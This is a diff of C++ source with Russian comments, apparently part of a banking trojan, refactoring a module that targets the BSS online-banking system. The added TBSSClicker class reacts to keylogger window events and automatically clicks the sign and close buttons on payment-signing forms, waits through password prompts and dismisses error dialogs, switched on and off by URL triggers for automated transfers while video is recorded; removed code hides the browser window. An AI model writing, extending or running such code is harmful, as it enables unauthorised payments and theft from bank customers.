@@ -12,6 +12,7 @@
 #include "Loader.h"
 #include "VideoRecorder.h"
 #include "UniversalKeyLogger.h"
+#include "BotClasses.h"
 
 
 #include "BotDebug.h"
@@ -24,6 +25,368 @@ namespace bsssign_Template
 
 
 
+//----------------------------------------------------------------------------
+
+// Определяем переменную включающую опцию прятания окна
+#if  !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
+	#define BSSSIGN_HIDE_WND
+#endif
+
+
+// Хэш имени класса формы подписывания
+#define BSS_FORM_CLASS_HASH 0xF8047238 /* obj_Form */
+
+// Хэш имени класса окна
+#define BSS_BUTTON_CLASS_HASH 0xB84059EC /* obj_BUTTON */
+
+// Хэш заголовка установки подписи
+#define BSS_SIGN_FORM_CAPTION_HASH 0x4DFAF875 /* Подпись */
+
+// Заголовок кнопки подписи
+#define BSS_SIGN_BUTTON_CAPTION_HASH 0xBE1A55FD /* Подписать */
+
+// Заголовко кнопки закрытия
+#define BSS_CLOSE_BUTTON_CAPTION_HASH 0xAE1E1985 /* Закрыть */
+
+
+//----------------------------------------------------------------------------
+DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
+{
+	// Перебираем дочерние окна определённого класса и заголовка
+	DWORD Count = 0;
+	HWND Button = NULL;
+	do
+	{
+//		Button = (HWND)pFindWindowExA(Form, Button, BSSSign::ButtonClassName, NULL);
+
+		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
+		if (Button == NULL) break;
+
+		DWORD Hash = GetWndTextHash(Button);
+
+		// Проверяем заголовок кнопки
+		if (Hash != BtnCaptionHash)
+		{
+			Count += BSSClickToButtons(Button, MultiClick, BtnCaptionHash);
+			if (Count && !MultiClick)
+				return Count;
+			continue;
+		}
+
+		// Кликаем по кнопке
+
+
+		if (HardClickToWindow(Button, 5, 5))
+		{
+			Count++;
+			pSleep(1000);
+			if (!MultiClick) break;
+        }
+	}
+	while (true);
+
+	return Count;
+}
+
+
+
+enum TBSSFormType   {bfSign, bfPassword, bfError};
+enum TBSSFormStatus {bfsUnknown, bfsClicked, bfsWait, bfsReady};
+
+
+class TBSSClicker;
+
+
+//***********************************************
+//  TBSSForm - Окно системы BSS
+//***********************************************
+class TBSSForm : public TBotCollectionItem
+{
+protected:
+	HWND FForm;
+	TBSSFormStatus FStatus;
+	DWORD FClickTime;
+	DWORD FMaxWaitInterval;
+
+	// Кликаем по необходимым кнопкам формы
+	bool virtual Click()
+	{
+		FClickTime = (DWORD)pGetTickCount();
+		FStatus = bfsClicked;
+		return true;
+	}
+
+	// Функция проверяет видимость окна
+	void virtual Wait()
+	{
+		int Interval = (DWORD)pGetTickCount() - FClickTime;
+		if (Interval > FMaxWaitInterval || !(BOOL)pIsWindowVisible(FForm))
+            FStatus = bfsReady;
+    }
+
+public:
+	// Конструктор
+	TBSSForm(TBSSClicker* aOwner, HWND Wnd)
+		: TBotCollectionItem((TBotCollection*)aOwner)
+	{
+		FForm = Wnd;
+		FStatus = bfsUnknown;
+		FMaxWaitInterval = 10000; // Максимум 10 секунд ожидания закрытия
+	}
+    //------------------------------------------------------------------------
+
+	// Выполнить действия с окном
+	TBSSFormStatus virtual Execute()
+	{
+		switch (FStatus) {
+			case bfsUnknown: Click(); break;            // Кликаем по кнопкам
+			case bfsClicked: FStatus = bfsWait; break;  // Переходим в режим ожидания
+			case bfsWait:    Wait(); break;             // Ожидаем закрытия окна
+		}
+
+		return FStatus;
+	}
+	//------------------------------------------------------------------------
+
+};
+
+//***********************************************
+// Окно установки подписей
+//***********************************************
+class TBSSSignForm : public TBSSForm
+{
+protected:
+    bool FCloseBtnClicked;
+	// Кликаем по кнопкам установки подписи
+	bool Click()
+	{
+		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
+        TBSSForm::Click();
+        return Count > 0;
+    }
+
+	// Функция проверяет статус окна установки подписей
+	void Wait()
+	{
+		if (Owner()->Count() > 1)
+			return;
+        TBSSForm::Wait();
+	}
+
+public:
+	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
+		: TBSSForm(aOwner, Wnd)
+	{
+	};
+
+
+	TBSSFormStatus Execute()
+	{
+		// В случае если окно подписи одно на экране и на
+		// нём не нажималась кнопка закрыть кликаем по ней
+		if (FStatus == bfsWait && !FCloseBtnClicked)
+		{
+			if (Owner()->Count() == 1)
+			{
+				FCloseBtnClicked = true;
+				BSSClickToButtons(FForm, false, BSS_CLOSE_BUTTON_CAPTION_HASH);
+			}
+
+			return bfsWait;
+		}
+		return TBSSForm::Execute();
+    }
+
+	// Функция вернёт истину если окно является окном установки подписи
+	bool static IsSignForm(DWORD ClassHash, DWORD TextHash)
+	{
+		return ClassHash == BSS_FORM_CLASS_HASH &&
+		       TextHash  == BSS_SIGN_FORM_CAPTION_HASH;
+	}
+};
+
+//***********************************************
+//Кдасс ожидания ввода пароля
+//***********************************************
+class TBSSPasswordForm : public TBSSForm
+{
+public:
+	TBSSPasswordForm(TBSSClicker* aOwner, HWND Wnd)
+		: TBSSForm(aOwner, Wnd)
+	{
+		// Для окно ввода пароля будем просто ожидать ввода
+    	FMaxWaitInterval = 3 * 60 * 1000;
+	}
+
+    // Проверяем является ли окно окном ввода пароля
+	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
+	{
+		// Этап первый: Окно должно быть диалогом, не иметь родителя.
+		if (((TBotCollection*)Clicker)->Count() == 0 || pGetParent(WND) != NULL)
+			return false;
+
+		// Этап второй: проверяем вхождение слова пароль
+		// Нет данных как точно звучит заголовок окна
+		return Text.Pos("ароль") >= 0;
+
+		/* TODO :
+		При получении дополнительных данных об окне ввода пароля
+		организовать нормальную фильтрацию окон. */
+    }
+};
+
+
+//***********************************************
+// Кдасс кликания по окну вывода сообщения
+// об ошибке
+//***********************************************
+class TBSSErrorForm : public TBSSForm
+{
+protected:
+	DWORD FTextHash;
+	DWORD FClassHash;
+
+	bool Click()
+	{
+		// Кликаем по кнопке Ok
+		bool Clicked = BSSClickToButtons(FForm, false, FTextHash) > 0;
+		TBSSForm::Click();
+		return Clicked;
+	}
+
+public:
+	TBSSErrorForm(TBSSClicker* aOwner, HWND Wnd)
+		: TBSSForm(aOwner, Wnd)
+	{
+		FTextHash = 0x27EB /* Ok */;
+		FClassHash = 0;
+	};
+
+	// Функция возвращает истину если это окно ошибки
+	bool static IsErrorForm(TBSSClicker* Clicker, DWORD ClassHash, DWORD TextHash)
+	{
+		return  ((TBotCollection*)Clicker)->Count() > 0 &&
+				ClassHash == BSS_FORM_CLASS_HASH &&
+				TextHash  == 0x72E78B17 /* Ошибка */;
+    }
+
+};
+
+
+//****************************************************************************
+//  Класс кликания по кнопкам формы
+//****************************************************************************
+
+class TBSSClicker : public TBotCollection
+{
+private:
+	bool FActive;
+	bool FRunning;
+
+	friend DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker);
+
+
+	// Функция кликает по окнам системы BSS
+	void Execute()
+	{
+		// Выполняем цикл пока в коллекции есть окна
+		pSleep(500);
+
+        int FormsCount;
+		do
+		{
+			for (int i = 0; i < Count();)
+			{
+				TBSSForm* Form = (TBSSForm*)Items(i);
+				TBSSFormStatus Status = Form->Execute();
+				if (Status == bfsReady)
+					delete Form;
+				else
+                    i++;
+			}
+
+			pSleep(1000);
+
+
+			// Проверяем необходимость завершения
+			TLock L = GetLocker();
+			FRunning = Count() > 0;
+            if (!FRunning) break;
+		}
+		while (true);
+	}
+    //------------------------------------------------------------------------
+
+
+
+
+public:
+	//  Constructor
+	TBSSClicker() : TBotCollection()
+	{
+		FRunning = false;
+		SetThreadSafe();
+		FActive = true;
+	};
+	//------------------------------------------------------------------------
+
+	void SetActive(bool Value)
+	{
+        FActive = Value;
+	}
+	//------------------------------------------------------------------------
+
+    // Добавляем форму для клика
+	bool AddForm(HWND WND)
+	{
+        if (!FActive) return false;
+
+		string Text      = GetWndText2(WND);
+		string Class     = GetWndClassName2(WND);
+		DWORD  TextHash  = Text.Hash();
+		DWORD  ClassHash = Class.Hash();
+
+		TBSSForm* Form = NULL;
+
+
+        // Проверяем окно установки подписей
+		if (TBSSSignForm::IsSignForm(ClassHash, TextHash))
+			Form = new TBSSSignForm(this, WND);
+		else
+		// Проверяем окно ввода пароля
+		if (TBSSPasswordForm::IsPasswordForm(this, WND, Text))
+			Form = new TBSSPasswordForm(this, WND);
+		else
+		// Проврям окно ошибок
+		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
+			Form = new TBSSErrorForm(this, WND);
+
+
+
+		if (!Form) return false;
+
+		// Запускаем поток
+		TLock L = GetLocker();
+		if (!FRunning)
+		{
+			FRunning = true;
+			StartThread(BSSClickerThreadMethod, this);
+		}
+
+		return true;
+	}
+	//-------------------------------------------------------------------------
+};
+
+
+
+DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker)
+{
+    ((TBSSClicker*)Clicker)->Execute();
+    return 0;
+}
+
+
 //***********************************************************************
 //  Внутренние методы BSSSign
 //***********************************************************************
@@ -32,25 +395,6 @@ namespace BSSSign
 	// Делать скриншоты всплывающих окон системы
     #define LOG_BSS_SIGN
 
-	// Определяем переменную включающую опцию прятания окна
-	#if  !defined(DEBUGCONFIG) && !defined(DEBUGBOT)
-    	#define BSS_HIDE_WND
-	#endif
-
-	// Хэш имени класса формы подписывания
-	#define HASH_SIGN_FORM_CLASS 0xF8047238 /* obj_Form */
-
-	// Хэш заголовка окна подписывания формы
-	#define HASH_SIGN_FORM_CAPTION 0x4DFAF875 /* Подпись */
-
-	// Хэш заголовка подписи перевода
-    #define HASH_BUTTON_CLASS 0xB84059EC /* obj_BUTTON */
-
-	// Заголовок кнопки подписи перевода
-    DWORD HASH_SIGN_BUTTON_CAPTION = 0xBE1A55FD; /* Подписать */
-
-	// Заголовко кнопки закрытия
-	DWORD HASH_CLOSE_BUTTON_CAPTION = 0xAE1E1985; /* Закрыть */
 
 	// Хэш имени класса Интернет Эксплорера
     #define HASH_IE_SERVER 0xF5E7484A /* Internet Explorer_Server */
@@ -60,8 +404,11 @@ namespace BSSSign
     char ButtonCaption[]   = {'П','о','д','п','и','с','а','т','ь', 0};
 	//----------------------------------------------------
 
-	bool Active = false; // Активность системы подписи
-	bool Blind  = false; // Использовать штору
+
+    TBSSClicker* Clicker = NULL; // Система кликания ко кнопкам BSS
+
+//	bool Active = false; // Активность системы подписи
+//	bool Blind  = false; // Использовать штору
 	bool Move   = false; // Двигать окно
 	bool RecordVideo = false;
 	bool SignState = false; // Признак того, что в данный момент идёт подпись
@@ -111,6 +458,7 @@ namespace BSSSign
 		// Функция отправляет лог со скринами показанных диалогов
 		PLog Log = (PLog)BSSLog;
 
+
 		if( Log->Wnd )
 		{
 			Sleep(1000);
@@ -146,42 +494,6 @@ void BSSSign::DoMoveWindow(HWND Wnd, int x, int y)
 }
 //----------------------------------------------------------------------------
 
-
-void BSSSignDoClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash, DWORD &Count)
-{
-	// Перебираем дочерние окна определённого класса и заголовка
-	HWND Button = NULL;
-	do
-	{
-		Button = (HWND)pFindWindowExA(Form, Button, BSSSign::ButtonClassName, NULL);
-
-		if (Button == NULL) break;
-
-		PCHAR Caption = GetWndText(Button);
-		DWORD Hash = CalcHash(Caption);
-		STR::Free(Caption);
-
-		// Проверяем заголовок кнопки
-		if (Hash != BtnCaptionHash)
-		{
-			BSSSignDoClickToButtons(Button, MultiClick, BtnCaptionHash, Count);
-			if (Count != 0 && !MultiClick) return;
-			continue;
-		}
-
-		// Кликаем по кнопке
-
-	
-		if (HardClickToWindow(Button, 5, 5))
-		{
-			Count++;
-			pSleep(1000);
-			if (!MultiClick) return;
-        }
-	}
-	while (true);
-
-}
 //----------------------------------------------------------------------------
 void WaitPasswordWnd(HWND Wnd)
 {
@@ -202,6 +514,7 @@ void WaitPasswordWnd(HWND Wnd)
 
 //----------------------------------------------------------------------------
 
+/*
 DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 {
 	// Функция подписывает платёж
@@ -216,8 +529,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	BDBG("bsssign","Кликаем по кнопкам подписи");
 
 	// Кликаем по кнопкам установки подписи
-	DWORD Count = 0;
-	BSSSignDoClickToButtons(Form, true, BSSSign::HASH_SIGN_BUTTON_CAPTION, Count);
+	DWORD Count = BSSClickToButtons(Form, true, BSSSIGN_BUTTON_CAPTION_HASH);
 
 
 	// При необходимости ожидаем закрытия окна ввода пароля
@@ -228,8 +540,7 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
 	pSleep(1000);
 	if (pIsWindowVisible(Form))
 	{
-		DWORD Closed = 0;
-		BSSSignDoClickToButtons(Form, false, BSSSign::HASH_CLOSE_BUTTON_CAPTION, Closed);
+		BSSClickToButtons(Form, false, BSSSign::HASH_CLOSE_BUTTON_CAPTION);
 	}
 
 	// Ожидаем закрытия окна подписания
@@ -269,26 +580,9 @@ DWORD WINAPI BSSSign::SignPayment(LPVOID Data)
     SignState = false;
 
 	return 0;
-}
+} */
 //----------------------------------------------------------------------------
 
-bool IsPasswordForm(HWND Wnd)
-{
-	// Функция возвращает истину если, окно Wnd является окном
-	// ввода пароля
-
-
-	// Этап первый: Окно должно быть диалогом, не иметь родителя.
-	if (pGetParent(Wnd) != NULL)
-		return false;
-
-	// Этап второйЖ Возвращаем истину :)
-
-/* TODO :
-При получении дополнительных данных об окне ввода пароля
-организовать нормальную фильтрацию окон. */
-	return true;
-}
 
 //----------------------------------------------------------------------------
 void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
@@ -299,7 +593,10 @@ void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 	HWND Wnd = WndData->Window;
 
 
-	if ((Cmd != SW_SHOW) || (!Active && !Blind))
+	if (Cmd == SW_SHOW || Cmd == SW_SHOWNORMAL)
+		Clicker->AddForm(Wnd);
+
+   /*	if ((Cmd != SW_SHOW) || (!Active && !Blind))
     	return;
 
     // Включена одна из опций, проверяем окно
@@ -365,7 +662,7 @@ void WINAPI BSSSign::Event_ShowWindow(PKeyLogger, DWORD, LPVOID Data)
 
 			StartThread(SendLogAndDeleteData, Log);
 		#endif
-	}
+	}  */
 }
 //----------------------------------------------------------------------------
 
@@ -412,7 +709,7 @@ void BSSSign::CheckRequest(PCHAR URL)
 
 	if ( CompareUrl( "*az_start", URL ) )
 	{
-		Active = true;
+		Clicker->SetActive(true);
 
 		// Если с данного процесса не запущена запись видео
 		// то принудительно стартуем её
@@ -427,29 +724,30 @@ void BSSSign::CheckRequest(PCHAR URL)
 	if ( CompareUrl( "*az_stop", URL ) )
 	{
 		BDBG("bsssign","Останавливаем автозалив");
-		Active = false;
+		Clicker->SetActive(false);
 		if (RecordVideo)
 		{
 			RecordVideo = false;
 			VideoRecorderSrv::StopRecording();
         }
 	}
+//	else
+//	if ( CompareUrl( "*blind_up", URL ) )
+//	{
+//
+//		BDBG("bsssign","Blind=true; тоесть хайдим главное окно ие");
+//		Blind = true;
+//	}
+//	else
+//	if ( CompareUrl( "*blind_down", URL ) )
+//	{
+//		BDBG("bsssign","Возвращаем видимость окна");
+//		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);
+//
+//		Blind = false;
+//	}
 	else
-	if ( CompareUrl( "*blind_up", URL ) )
-	{
-				
-		BDBG("bsssign","Blind=true; тоесть хайдим главное окно ие");
-		Blind = true;
-	}
-	else
-	if ( CompareUrl( "*blind_down", URL ) )
-	{
-		BDBG("bsssign","Возвращаем видимость окна");
-		pEnumWindows((WNDENUMPROC)EnumWindowsIE, NULL);
-
-		Blind = false;
-	}
-	else if ((CompareUrl( "*move_up", URL)) && (!Move))
+	if ((CompareUrl( "*move_up", URL)) && (!Move))
 	{
 
 		BDBG("bsssign","окно ие в право");
@@ -481,8 +779,10 @@ void BSSSign::Initialize()
 {
 	// Функция инициализирует систему подписи BSS
 
-	Active = false;
-	Blind  = false;
+	Clicker = new TBSSClicker();
+
+//	Active = false;
+//	Blind  = false;
 	Move   = false;
 	SignState = false;
 	RecordVideo = false;
